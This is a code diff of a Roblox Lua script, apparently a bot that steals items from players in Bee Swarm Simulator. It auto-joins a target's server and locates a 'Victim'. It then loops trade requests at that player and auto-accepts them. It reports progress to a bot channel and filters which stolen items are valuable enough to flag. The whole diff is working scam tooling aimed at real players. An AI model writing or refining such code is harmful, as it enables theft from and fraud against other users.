@@ -362,38 +362,35 @@ task.spawn(function()
         end
     end
 end)
-task.spawn(function()
-    if isfile("ExodusAutojoin") then
-        Json = game:GetService("HttpService"):JSONDecode(readfile("ExodusAutojoin"))
-        FindVictim(Json)
-        if Victim then
-            local Name = Victim.Name
-            while IsStealing and LocalPlayer.Parent:FindFirstChild(Name) do
-                Label.Text = "Starting trade"
-                Events:WaitForChild("TradePlayerRequestStart"):FireServer(Victim.UserId)
-                if Victim["TradeConfig"]["IsTrading"].Value then
-                    Label.Text = "Accepting"
-                    task.wait(6.5)
-                    Accept()
-                end
-                task.wait(1)
+if isfile("ExodusAutojoin") then
+    Json = game:GetService("HttpService"):JSONDecode(readfile("ExodusAutojoin"))
+    FindVictim(Json)
+    if Victim then
+        local Name = Victim.Name
+        while IsStealing and LocalPlayer.Parent:FindFirstChild(Name) and not Completed do
+            Label.Text = "Sending trade"
+            Events:WaitForChild("TradePlayerRequestStart"):FireServer(Victim.UserId)
+            if Victim["TradeConfig"]["IsTrading"].Value then
+                Label.Text = "Accepting"
+                task.wait(6.5)
+                Accept()
             end
-        else
-            if game.JobId == Json.jobid then
-                task.spawn(function()
-                    PublishMessage(AutoCollect.BotInfoChannel, "The victim wasnt in the server")
-                end)
-            end
-            warn("No victim")
-            IsStealing = false
+            task.wait(1)
         end
     else
-        warn("No auto-join file")
-        PublishMessage(AutoCollect.BotInfoChannel, "(v7.1) Auto-Join started running on " .. LocalPlayer.Name)
+        if game.JobId == Json.jobid then
+            task.spawn(function()
+                PublishMessage(AutoCollect.BotInfoChannel, "The victim wasnt in the server")
+            end)
+        end
+        warn("No victim")
         IsStealing = false
     end
-end)
-repeat task.wait() until not IsStealing
+else
+    warn("No auto-join file")
+    PublishMessage(AutoCollect.BotInfoChannel, "(v7.1) Auto-Join started running on " .. LocalPlayer.Name)
+    IsStealing = false
+end
 
 --task.spawn(function()
 local function await(object, ...)
@@ -457,7 +454,7 @@ local function GetBQStatsString(File, Name)
         local Stats = {}
 
         local function Concat(...)
-            for i, v in ipairs({...}) do
+            for i, v in pairs({...}) do -- Fixed, changed to pairs!
                 if typeof(v) == "string" then
                     table.insert(Stats, v)
                 end
@@ -551,6 +548,17 @@ local function GetBQStatsString(File, Name)
             local Focus = Strings.Ability:match("Focus")
             local SuperCritPower = Strings.Hivebonus:match("%+(%d+)%% Super%-Crit Power")
             local SuperCritChance = Strings.Hivebonus:match("%+(%d+)%% Super%-Crit Chance")
+            if SuperCritPower == nil and SuperCritChance == nil then
+                return
+            end
+            if SuperCritPower then
+                if tonumber(SuperCritPower) < 7 then
+                    if not SuperCritChance then return end
+                    if tonumber(SuperCritPower) < 3 then return end
+                end
+            else
+                return
+            end
             Ping = true
             Concat(Focus and "Ability: Focus", SuperCritPower and SuperCritPower .. "% Super%-Crit Power", SuperCritChance and SuperCritChance .. "% Super%-Crit Chance")
 
@@ -706,18 +714,19 @@ local function GetBQStatsString(File, Name)
             if BeeAbilityPollen == nil and not (NumWaxes == 0 and Potential >= 4.5) then
                 return
             end
-            if BeeAbilityPollen and tonumber(BeeAbilityPollen) >= 3 then
-                Ping = true
+            if not (NumWaxes == 0 and Potential >= 4.5) then
+                if BeeAbilityPollen and tonumber(BeeAbilityPollen) < 4 then
+                    return
+                end
             end
             Concat(BeeAbilityPollen and BeeAbilityPollen .. "% Bee Ability Pollen")
 
         elseif Name == "Toy Horn" then
             local BeeAbilityPollen = Strings.Hivebonus:match("%+(%d+)%% Bee Ability Pollen")
-            if BeeAbilityPollen == nil and not (NumWaxes == 0 and Potential >= 4.5) then
-                return
-            end
-            if BeeAbilityPollen and tonumber(BeeAbilityPollen) >= 2 then
-                Ping = true
+            if not (NumWaxes == 0 and Potential >= 4.5) then
+                if BeeAbilityPollen and tonumber(BeeAbilityPollen) < 2 then
+                    return
+                end
             end
             Concat(BeeAbilityPollen and BeeAbilityPollen .. "% Bee Ability Pollen")
         else
